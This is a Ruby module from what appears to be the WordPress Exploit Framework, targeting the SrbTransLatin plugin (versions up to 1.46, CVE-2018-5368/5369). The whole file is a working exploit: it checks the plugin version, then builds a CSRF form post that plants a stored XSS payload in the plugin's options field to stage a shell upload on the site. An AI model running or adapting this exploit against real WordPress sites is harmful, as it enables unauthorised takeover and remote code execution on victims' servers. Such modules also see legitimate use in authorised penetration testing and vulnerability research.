# frozen_string_literal: true

class Wpxf::Exploit::SrbtranslatinCsrfXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'SrbTransLatin <= 1.46 CSRF Stored XSS Shell Upload',
      author: [
        'd4wner',   # Disclosure
        'rastating' # WPXF module
      ],
      references: [
        ['CVE', '2018-5368'],
        ['CVE', '2018-5369'],
        ['WPVDB', '9004']
      ],
      date: 'Jan 11 2018'
    )
  end

  def check
    check_plugin_version_from_changelog('srbtranslatin', 'readme.txt', '1.47')
  end

  def vulnerable_url
    "#{normalize_uri(wordpress_url_admin, 'options-general.php')}?page=srbtranslatoptions"
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'lang_identificator' => "script\\\"><script>#{xss_ascii_encoded_include_script}<\\/script>",
      'stl_default_language' => 'cir',
      'file_lang_delimiter' => '=',
      'sanitize_file_names' => 'on',
      'Submit' => 'Update Options'
    )
  end
end
